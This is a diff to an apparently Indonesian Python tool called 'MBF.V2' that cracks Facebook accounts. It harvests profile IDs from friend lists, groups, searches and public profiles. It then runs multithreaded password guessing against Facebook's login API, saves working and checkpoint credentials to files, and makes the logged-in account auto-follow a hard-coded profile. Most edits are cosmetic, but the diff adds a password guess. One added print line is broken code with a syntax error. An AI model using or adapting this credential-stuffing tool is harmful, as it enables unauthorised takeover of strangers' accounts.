@@ -151,7 +151,7 @@ def mbfv2():
                    fail()
                    peak()
                    cek = input("\033[0;90m ║═════════════════════════════════╗ \n \033[96m║\033[90m[\033[93mTekan \033[92mopen \033[93muntuk membuka Cokie\033[0;90m]\033[90m ║ \n \033[90m╚═════════════════════════════════╝ \n \033[90m╔═════════════════════════════════╗\n \033[90m║[\033[91m>_<\033[90m] \033[92mCokiee \033[1;91m~>\033[90m                  \033[90m║\n \033[90m╚═════════════════════════════════╝ \033[1;93m")
-                   print('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar\033[91m.\033[93m.\033[92m.');time.sleep(2)
+                   print('\n\033[97m [\033[92m*\033[97m] \033[92mHarap bersabar...')
              cek = {"cookie":cek}
              ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
              if "mbasic_logout_button" in str(ismi):
@@ -165,17 +165,16 @@ def mbfv2():
                            except:
                                   pass
                      try:
-                             ikuti = parser(requests.get(mbasic.format("/100071637038126"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ikuti = parser(requests.get(mbasic.format("/100070003230401"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
                      return cek["cookie"]
-                     aink('\033[1;97m[\033[1;94m+\033[1;97m] \033[1;92mLogin berhasil🖒...')
+                     aink('\033[1;97m[\033[1;94m+\033[1;97m] \033[1;92m[✓] Login berhasil...')
              else:
                   os.system("xdg-open https://youtu.be/QF0jMxC6CkE") 
                   os.system('rm -rf cookies')
-                  
-                  print(" \n \033[93m[\033[91m!\033[93m] Cookie Salah\033[91m°\033[93m~\033[91m°")
+                  print(" \n \033[93m[\033[91m!\033[93m] [x] Cookie Kadaluwarsa/Salah...")
                   os.system('python MBF.V2.py')
          def login(username,password,cek=False):
              global die,check,result,count
@@ -194,7 +193,7 @@ def mbfv2():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;97m  * \033[92m {username}|{password}                       ",end="")
+                 print(f"\r\033[1;97m  * => {username}|{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
@@ -203,7 +202,7 @@ def mbfv2():
                         with open('now.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[1;97m  * \033[93m {username}|{password}                    ",end="")
+                   print(f"\r\033[1;90m  * => {username}|{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
@@ -213,7 +212,7 @@ def mbfv2():
                                 f.write(username + '|' + password + '\n')
              else:
                    die += 1
-             for i in list('•|/•\|•'):
+             for i in list('\|/-•'):
                             print(f"\r\033[00m [\033[96m{i}\033[00m] \033[97mProses : \033[90m[\033[1;92m{str(die)}\033[90m] \033[93mcheckpoint \033[91m: \033[90m[\033[1;93m{str(check)}\033[90m] \033[92mNow \033[91m: \033[90m[\033[1;92m{str(result)}\033[90m]\033[00m",end="")
                             time.sleep(5.0)
          def getid(url):
@@ -226,7 +225,7 @@ def mbfv2():
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[1;97m [\033[1;94m+\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProses pengambilan ID... ",end="")
+                 print('\r\033[1;97m [\033[1;94m+\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;93m ID retrieval process... ",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -282,27 +281,27 @@ def mbfv2():
                    lupo_lupo_milzu()
                    fail()
                    peak()
-                   aink(" \033[92m║═*PILIH METODE CRACK")
-                   aink(" \x1b[92m║═╔═══════════════════════════════════════════════╗")
-                   aink(" \033[92m║═╚═>[\033[96m?\033[90m] \033[92m01\033[97m.\033[96mCRECK DAFTAR TEMAN                  \033[92m~═║")
-                   aink(" \033[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[96m?\033[90m] \033[92m02\033[97m.\033[96mCRECK DARI LIKE POST                \033[92m~═║")
-                   aink(" \033[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[96m?\033[90m] \033[92m03\033[97m.\033[96mCRECK DARI PENCARIAN NAMA           \033[92m~═║")
-                   aink(" \033[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[96m?\033[90m] \033[92m04\033[97m.\033[96mCRECK DARI GRUP                     \033[92m~═║")
-                   aink(" \033[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[96m?\033[90m] \033[92m05\033[97m.\033[96mCRECK DARI PUBLIK                   \033[92m~═║")
-                   aink(" \033[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[96m!\033[90m] \033[92m06\033[97m.\033[96mLIHAT HASIL CRECK                   \033[92m~═║")
-                   aink(" \x1b[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[96m?\033[90m] \033[92m07\033[97m.\033[96mHAPUS BISKUIT YANG LEZAT            \033[92m~═║")
-                   aink(" \033[92m║═╔═════════════════════════════════════════════~═║")
-                   aink(" \033[92m║═╚═>[\033[93m?\033[90m] \033[91m00\033[97m.\033[96mKELUAR                              \033[92m~═║")
-                   aink(" \033[92m╚═════════════════════════════════════════════════╝")
-                   print("\033[93m╭╼[Mrx.Milzu]─[05-09-2021]")
-                   print ("\033[93m~")
-                   doge=input("\033[93m╰╼▪>   \033[96m")
+                   aink(" \033[97m║═*\033[92mSaran Pilih \033[97m>\033[92m5\033[97m<")
+                   aink(" \x1b[97m║═╔═══════════════════════════════════════════════╗")
+                   aink(" \033[97m║═╚═>[\033[91mx\033[90m] \033[93m01\033[97m.\033[93mCRECK DAFTAR TEMAN                  \033[92m~═║")
+                   aink(" \033[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[91mx\033[90m] \033[93m02\033[97m.\033[93mCRECK DARI LIKE POST                \033[92m~═║")
+                   aink(" \033[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[91mx\033[90m] \033[93m03\033[97m.\033[93mCRECK DARI PENCARIAN NAMA           \033[92m~═║")
+                   aink(" \033[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[91mx\033[90m] \033[93m04\033[97m.\033[93mCRECK DARI GRUP                     \033[92m~═║")
+                   aink(" \033[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[97m√\033[90m] \033[97m05\033[97m.\033[97mCRECK DARI PUBLIK                   \033[92m~═║")
+                   aink(" \033[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[97m√\033[90m] \033[97m06\033[97m.\033[97mLIHAT HASIL CRECK                   \033[92m~═║")
+                   aink(" \x1b[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[97m√\033[90m] \033[97m07\033[97m.\033[97mHAPUS BISKUIT YANG LEZAT            \033[92m~═║")
+                   aink(" \033[97m║═╔═════════════════════════════════════════════~═║")
+                   aink(" \033[97m║═╚═>[\033[93m-\033[90m] \033[97m00\033[97m.\033[91mKELUAR                              \033[92m~═║")
+                   aink(" \033[97m╚═════════════════════════════════════════════════╝")
+                   print("\033[97m╭╼[Pilih]─[menu]")
+                   print ("\033[97m~")
+                   doge=input("\033[97m╰╼▪>   \033[97m")
                    if doge =="":
                          print("\n\n\033[00m [\033[91m!\033[00m] Harus dipilih!")
                          uwutc()
@@ -341,7 +340,7 @@ def mbfv2():
                          lol = input("\n lookat: ")
                          username = bysearch(mbasic.format('/search/people/?q='+lol))
                          if len(username) == 0:
-                                 exit("! Nama tidak ditemukan!")
+                                 exit(" Nama Failed !")
                    elif doge == '4' or doge =='04':
                          print("\033[1;97m\n [\033[1;94m▪▪\033[1;97m] Harap di isi \033[91m100 \033[00mID Grup ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[93mMasukin ID Grup \033[1;91m: \033[1;92m")
@@ -349,7 +348,7 @@ def mbfv2():
                          if len(username) == 0:
                                  exit("\033[90m[\033[91m!\033[90m] \033[97mGRUP ID TIDAK DITEMUKAN!")
                    elif doge == '5' or doge =='05':
-                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[92mUSERNAME/ID PUBLIK\033[1;91m: \033[1;92m")
+                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] \033[92mID PUBLIC\033[1;91m: \033[1;92m")
                          if knf.isdigit():
                                  user = "/profile.php?id=" + knf
                          else:
@@ -358,7 +357,7 @@ def mbfv2():
                                  user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                  username = getid(mbasic.format(user))
                          except TypeError:
-                                 exit("\033[90m[\033[91m!\033[90m] \033[97mPENGGUNA TIDAK DITEMUKAN!")
+                                 exit("\033[90m[\033[91m!\033[90m] \033[97mUser Is Failure!")
                    elif doge == '6' or doge =='06':
                          try:
                                  file1 = open("cp.txt").read()
@@ -383,7 +382,7 @@ def mbfv2():
                          except FileNotFoundError:
                                  exit("\n\033[00m[\033[91m!\033[00m] Kamu tidak mendapatkan hasil")
                    else:
-                         print("\n\n \033[00m[\033[91m😣\033[00m] Harus dipillih!")
+                         print("\n\n \033[00m[\033[91m😣\033[00m] Must choose!")
                          uwutc()
                    print()
                    lupo_lupo_milzu()
@@ -392,11 +391,12 @@ def mbfv2():
                    print('\033[97m\033[92mJUMLAH ID FB\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m \n",end="")       
                    expass = input("\n\033[1;93m [\033[1;96m?\033[1;93m] + Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password2 \033[1;91m: \033[1;92m")
+                   expass = input("\033[1;92m [\033[1;96m?\033[1;92m] + Password3 \033[1;91m: \033[1;92m")
                    aink('\x1b[1;94m────────────────────────────────────────────────────\n')
                    lupo_lupo_milzu()
                    fail()
                    peak()
-                   print('\033[92m   Semua ID\x1b[1;91m :\033[92m ' + str(len(id)) + "\n\033[92m \n",end="")
+                   print('\033[92m   Semua ID\x1b[1;91m :x1b[1;92m ' + str(len(id)) + ,end="")
                    print('\n\033[91m [\033[1;90m+\033[91m] \033[97mhasil\033[92m Now\033[97m di\033[92msimpan \033[97mdi \033[93m: \033[92mnow.txt\n \033[91m[\033[90m-\033[91m] \033[97mhasil\x1b[1;93m Checkpoint \033[97mdi\033[92msimpan \033[97mdi \033[91m: \033[93mcp.txt')
                    print('\n \033[97m[\x1b[1;91m▪\x1b[1;97m] \033[91mMatikan \033[92mdata \033[97mseluler untuk menjeda proses \033[93mcrack\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
@@ -405,10 +405,10 @@ def mbfv2():
                                   ss = users[0].split(' ')
                                   for x in ss:
                                           listpass = [
-                                                  str(x) + '',
                                                   str(x) + '123',
                                                   str(x) + '1234',
                                                   str(x) + '12345',
+                                                  str(x) + '123456',
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
@@ -418,11 +418,11 @@ def mbfv2():
                            print("\n\n\x1b[1;92m  *\033[92m Selesai...")
      
                    else:
-                           print("\n\n\x1b[1;91m  *\033[93m kamu tidak memiliki hasil apapun:(")
+                           print("\n\n\x1b[1;91m  *\033[93m No result:(")
                except (KeyboardInterrupt,EOFError):
                        exit()
                except requests.exceptions.ConnectionError:
-                       exit("\n\n\033[00m  [\033[91m!\033[00m] Putus Koneksi")
+                       exit("\n\n\033[00m  [\033[91m!\033[00m] Connection")
 
     elif uwu == "2" or uwu =="02":
          os.system("xdg-open https://youtu.be/QF0jMxC6CkE")
@@ -431,18 +431,26 @@ def mbfv2():
          os.system('xdg-open https://www.facebook.com/groups/338110617616908')
          mbfv2()
     elif uwu == "4" or uwu =="04":
-         os.system('xdg-open https://chat.whatsapp.com/EEl2Erzh6jkEahbYE3QMu2')
+         time.sleep(0.01)
+         print("Mau masuk Grup WhatsApp Ya om...")
+         print("jangan lupa jika masuk bawa gorengan ya om...")
+         print("daftarkan diri kamu ke admin ya om...")
+         os.system('xdg-open https://chat.whatsapp.com/K4FgARckBivK9AQACzo5ae')
          mbfv2()
     elif uwu == "5" or uwu =="05":
-         print("\n\n\x1b[1;97m      [ \x1b[1;92m[▪] Tunggu sebentar... \x1b[1;97m ]\n")
-         print("\033[93m [~] PROSES SEDANG BERJALAN ")
+         time.sleep(0.1)
+         print("\n\n\x1b[1;97m      [\033[93m Sabar om sedang di update... \x1b[1;97m ]")
+         print("\n\033[93m [~] update Process ")
          os.system("git pull")
-         print("\n \x1b[1;97m[\x1b[1;92m+\x1b[1;97m]\x1b[1;93m Sudah di update.!!\n ")
-         mbfv2()
+         print("\n\ Sudah di update om.!! ")
+         print("\n\ Silahkan Mulai Ulang... ")
+         print("untuk menjalankan proses update => python MBF.V2.py")
+         exit()
     elif uwu == "0" or uwu =="00":
+         time.sleep(0.1)
          aink("\n\033[1;92m Terima kasih sudah menggunakan tools ini.\n  Dan jangan lupa subscribe chanel youtube saya\n\n")
          os.system("xdg-open https://youtube.com/channel/UCqHIxnz-uxVzLXARplFzzqQ")
-         aink("\033[93m [▪] BYE...")
+         aink("\033[93m Sampai ketemu dimasa depan ya om...")
          exit()
 
 if __name__=="__main__":
